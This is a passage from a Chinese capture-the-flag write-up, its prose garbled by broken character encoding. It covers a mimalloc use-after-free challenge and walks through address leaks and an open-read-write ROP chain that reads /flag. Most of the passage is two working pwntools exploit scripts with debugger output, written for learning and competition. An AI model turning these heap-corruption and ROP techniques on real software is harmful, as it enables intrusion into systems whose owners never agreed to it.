class="line">patchelf --set-rpath &#x27;/home/grxer/Desktop/share/2023hws/mi&#x27; ./pwn </span><br><span class="line">patchelf --set-rpath &#x27;/home/grxer/Desktop/share/2023hws/mi/&#x27; ./libmimalloc.so.2</span><br><span class="line">patchelf --set-interpreter &#x27;/home/grxer/Desktop/share/2023hws/mi/ld.so&#x27;  ./pwn</span><br></pre></td></tr></table></figure><p>åˆ é™¤æ—¶æ²¡æœ‰å°†å­˜æ”¾æŒ‡é’ˆå¤„ç½®0ï¼Œå­˜åœ¨uafæ¼æ´ï¼Œå¼€å¯äº†æ²™ç®±</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">1</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1<span class="number">-8</span>))</span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">1</span>) #<span class="number">3</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;b&quot;</span>*<span class="number">1</span>) #<span class="number">4</span></span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;c&quot;</span>*<span class="number">1</span>) #<span class="number">5</span> </span><br><span class="line">add(<span class="number">800</span>,b<span class="string">&quot;d&quot;</span>*<span class="number">8</span>) #<span class="number">6</span></span><br></pre></td></tr></table></figure><p>åˆ é™¤1å’Œ2ï¼Œåˆ©ç”¨uafå†ä¿®æ”¹2çš„è¯ä¼šæŠŠåŸæ¥çš„ç©ºé—²å †å—é“¾æ¡2â€“&gt;1å˜ä¸º2â€“&gt;leak1-8ï¼Œåé¢å†ç”³è¯·åˆ°#6æ—¶å°±å¯ä»¥æ‹¿åˆ°leak1-8è¿™ä¸ªå †å—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥ç”³è¯·ä»»æ„åœ°å€çš„å †å—</p><p>æœ‰äº†ä»»æ„ç”³è¯·ä¹‹åå°±æ˜¯åœ°å€æ³„éœ²ï¼Œå¯ä»¥åˆ©ç”¨ç®€å•çš„ç”³è¯·ä¸€ä¸ªå †å’Œshowå‡½æ•°æ¥æ³„éœ²mimallocå †å—çš„èµ·å§‹åœ°å€ä¹Ÿå°±æ˜¯mapsçš„æœ€ä¸Šé¢é‚£ä¸€å—ï¼Œç„¶åå‘ç°ä»–èµ·å§‹åœ°å€åç§»+0x160ä½ç½®å¤„æœ‰ä¸€ä¸ªåœ°å€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">     <span class="number">0x55060000000</span>      <span class="number">0x55064000000</span> rw-p  <span class="number">4000000</span>      <span class="number">0</span> [anon_55060000]</span><br><span class="line">pwndbg&gt; tel <span class="number">0x55060000000</span>+<span class="number">0x160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚  <span class="number">0x55060000160</span> â€”â–¸ <span class="number">0x7fe7da5a5740</span> â—‚â€” <span class="number">0x7fe7da5a5740</span></span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°0x7fe7da5a5740åç§»+0x300å¤„æœ‰ä¸€ä¸ªåœ°å€æ˜¯æ ˆä¸Šçš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tel <span class="number">0x7fe7da5a5740</span>+<span class="number">0x300</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚  <span class="number">0x7fe7da5a5a40</span> â€”â–¸ <span class="number">0x7fffa5cd7100</span> â€”â–¸ <span class="number">0x5642b1dc7950</span> â—‚â€” endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚  <span class="number">0x7fe7da5a5a48</span> â—‚â€” <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€æ­¥æ­¥ç”³è¯·ï¼Œshowæ³„éœ²åœ°å€çš„æ–¹æ³•ä¸€ç›´æ³„éœ²åˆ°è¿™ä¸ªæ ˆåœ°å€0x7fffa5cd7100ï¼ˆè¿™é‡Œä¸€ç›´ç”³è¯·æ³„éœ²åœ°å€-8å¤„çš„å †å—ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢addæ—¶è¾“å…¥è¦†ç›–äº†è¦æ³„éœ²çš„åœ°å€ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ ˆåœ°å€+åç§»ï¼Œæ³„éœ²é‡ŒlibcåŸºåœ°å€ï¼Œç„¶åæ¥è¦†ç›–editè¿”å›åœ°å€æ¥orwï¼Œæ¯”èµ›æ—¶ä¼¼ä¹æœ‰å¸¦çŒªè„‘è¿‡è½½ï¼Œä¸‹é¢çš„payloadæœ‰ç‚¹çŠ¯å‚»çš„é¥¶äº†åœˆå­æ¥orwï¼Œå…ˆæ”¹äº†editè¿”å›çš„ebpä¸º__libc_start_main+243è¿”å›åœ°å€-8çš„ä½ç½®å’Œè¿”å›åœ°å€ä¸ºleave retï¼Œç„¶ååœ¨__libc_start_main+243å¤„æ„é€ äº†orwï¼Œèµ›åæƒ³æƒ³å…¶å®ç›´æ¥æ”¹editè¿”å›åœ°å€ä¸ºorwå³å¯ï¼Œå†ä»”ç»†æƒ³æƒ³å…¶å®è¿pieéƒ½ä¸ç”¨æ³„éœ²å‘œå‘œå‘œ</p><h3 id="æ¯”èµ›æ—¶çŒªè„‘è¿‡è½½çš„EXP"><a href="#æ¯”èµ›æ—¶çŒªè„‘è¿‡è½½çš„EXP" class="headerlink" title="æ¯”èµ›æ—¶çŒªè„‘è¿‡è½½çš„EXP"></a>æ¯”èµ›æ—¶çŒªè„‘è¿‡è½½çš„EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc_elf=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;123.60.179.52&quot;</span>,<span class="string">&quot;30304&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sa(<span class="string">b&#x27; Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0016B9)&#x27;) #free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl()</span><br><span class="line">base=uu64(r(<span class="number">6</span>))&amp;<span class="number">0xfffff000000</span></span><br><span class="line"><span class="comment"># 0x3755c020461</span></span><br><span class="line"><span class="comment"># 0x3755c 000000</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">1</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">1</span>) <span class="comment">#5 </span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak2=uu64(r(<span class="number">6</span>))</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">p(<span class="string">&#x27;leak2&#x27;</span>,leak2)</span><br><span class="line">p(<span class="string">&#x27;leak3&#x27;</span>,leak3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(leak3-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#11</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;h&quot;</span>*<span class="number">8</span>) <span class="comment">#12</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_stack=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;leak_stack&#x27;</span>,leak_stack)</span><br><span class="line">__libc_start_main_243_stack=leak_stack-(<span class="number">0x7ffc8d14f0d0</span>-<span class="number">0x7ffc8d14f0a8</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main_243_stack&#x27;</span>,__libc_start_main_243_stack)</span><br><span class="line"><span class="comment"># 0x1950</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#17</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;i&quot;</span>*<span class="number">8</span>) <span class="comment">#18</span></span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">__libc_start_main=uu64(r(<span class="number">6</span>))-<span class="number">243</span></span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#19</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">edit(<span class="number">20</span>,p64(leak_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#21</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#22</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#23</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;j&quot;</span>*<span class="number">8</span>) <span class="comment">#24</span></span><br><span class="line">show(<span class="number">24</span>)</span><br><span class="line">ru(<span class="string">b&#x27;j&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">pie=uu64(r(<span class="number">6</span>))-<span class="number">0x1950</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">systemcall=base+libc_elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;systemcall&#x27;</span>,systemcall)</span><br><span class="line">write=base+libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=base+libc_elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi=pie+<span class="number">0x00000000000019b3</span></span><br><span class="line">pop_rsi_r15=pie+<span class="number">0x00000000000019b1</span></span><br><span class="line">pop_rdx=base+<span class="number">0x0000000000142c92</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">edit_ret=__libc_start_main_243_stack-<span class="number">0x20</span></span><br><span class="line">p(<span class="string">&#x27;edit_ret&#x27;</span>,edit_ret)</span><br><span class="line">bss=__libc_start_main_243_stack+<span class="number">0x100</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(leak1)+p64(<span class="number">0xdeadbeef</span>)+p64(systemcall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">60</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(write)</span><br><span class="line">edit(<span class="number">18</span>,payload)</span><br><span class="line">leave_ret=<span class="number">0x01840</span>+pie</span><br><span class="line">p(<span class="string">&#x27;leaveret&#x27;</span>,leave_ret)</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#25</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#26</span></span><br><span class="line">dele(<span class="number">25</span>)</span><br><span class="line">dele(<span class="number">26</span>)</span><br><span class="line">edit(<span class="number">26</span>,p64(edit_ret-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#27</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#28</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#29</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#30</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#31</span></span><br><span class="line">ret=pie+<span class="number">0x1841</span></span><br><span class="line"><span class="comment"># edit(31,p64(__libc_start_main_243_stack)+p64(leave_ret))</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">31</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>)+p64(leave_ret))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubantu20 ~/D/s/2/mi&gt; ROPgadget  --binary ./libc.so.6 --only &#x27;pop|ret&#x27; | grep rdx</span></span><br><span class="line"><span class="string">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="èµ›åå†™wpå¤´è„‘æ¸…é†’ï¼Œç›´æ¥ä¿®æ”¹editè¿”å›åœ°å€çš„ï¼Œä¸ç”¨æ³„éœ²pieçš„exp"><a href="#èµ›åå†™wpå¤´è„‘æ¸…é†’ï¼Œç›´æ¥ä¿®æ”¹editè¿”å›åœ°å€çš„ï¼Œä¸ç”¨æ³„éœ²pieçš„exp" class="headerlink" title="èµ›åå†™wpå¤´è„‘æ¸…é†’ï¼Œç›´æ¥ä¿®æ”¹editè¿”å›åœ°å€çš„ï¼Œä¸ç”¨æ³„éœ²pieçš„exp"></a>èµ›åå†™wpå¤´è„‘æ¸…é†’ï¼Œç›´æ¥ä¿®æ”¹editè¿”å›åœ°å€çš„ï¼Œä¸ç”¨æ³„éœ²pieçš„exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc_elf=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;123.60.179.52&quot;</span>,<span class="string">&quot;30304&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sa(<span class="string">b&#x27; Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0016B9)&#x27;) #free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl()</span><br><span class="line">base=uu64(r(<span class="number">6</span>))&amp;<span class="number">0xfffff000000</span></span><br><span class="line"><span class="comment"># 0x3755c020461</span></span><br><span class="line"><span class="comment"># 0x3755c 000000</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">1</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">1</span>) <span class="comment">#5 </span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak2=uu64(r(<span class="number">6</span>))</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">p(<span class="string">&#x27;leak2&#x27;</span>,leak2)</span><br><span class="line">p(<span class="string">&#x27;leak3&#x27;</span>,leak3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span 